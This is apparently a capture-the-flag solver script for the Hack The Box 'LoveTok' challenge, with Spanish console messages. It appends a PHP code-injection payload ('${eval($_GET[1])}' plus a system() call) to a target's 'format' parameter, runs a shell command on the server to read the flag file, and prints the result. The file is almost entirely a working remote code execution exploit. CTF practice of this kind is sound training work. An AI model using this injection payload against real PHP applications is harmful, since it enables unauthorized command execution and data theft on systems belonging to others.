import requests, argparse, signal
from bs4 import BeautifulSoup

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

def ctrl_c():
    print(RED + "[!] Saliendo...")
    exit(1)

signal.signal(signal.SIGINT, ctrl_c)

parse = argparse.ArgumentParser()
parse.add_argument('-u', '--url', help="Url del challenge HTB")
parse = parse.parse_args()

banner = f"""
{GREEN}
██╗      ██████╗ ██╗   ██╗███████╗████████╗ ██████╗ ██╗  ██╗
██║     ██╔═══██╗██║   ██║██╔════╝╚══██╔══╝██╔═══██╗██║ ██╔╝
██║     ██║   ██║██║   ██║█████╗     ██║   ██║   ██║█████╔╝ 
██║     ██║   ██║╚██╗ ██╔╝██╔══╝     ██║   ██║   ██║██╔═██╗ 
███████╗╚██████╔╝ ╚████╔╝ ███████╗   ██║   ╚██████╔╝██║  ██╗
╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
{CYAN}BY: Alcatraz2033{RESET}{GREEN}
██╗  ██╗████████╗██████╗                                    
██║  ██║╚══██╔══╝██╔══██╗                                   
███████║   ██║   ██████╔╝                                   
██╔══██║   ██║   ██╔══██╗                                   
██║  ██║   ██║   ██████╔╝                                   
╚═╝  ╚═╝   ╚═╝   ╚═════╝                                    
{RESET}
"""

if parse.url:
    if ("/?format=" not in parse.url):
        parse.url += "?format="
    url = parse.url + "${eval($_GET[1])}&1=system('cat%20../flagEa4ca');" 
    try:
        r = requests.get(url)
        p = BeautifulSoup(r.text, 'html5lib')
        lista = list()

        for i in p.text.split('\n'):
            lista.append(i)
        print(banner)
        print(GREEN + "[*] Flag: " + RESET + lista[0])

    except Exception as e:
        print(banner)
        print(RED + "[!] Error al conectarse a la url...")
else:
    print(banner)
    print(RED + "[!]" + RESET + " No ha ingresado la url")
    print(CYAN + "[+]" + RESET + " Ejemplo: python3 lovetokHTB.py -u http://template.htb:9999/")
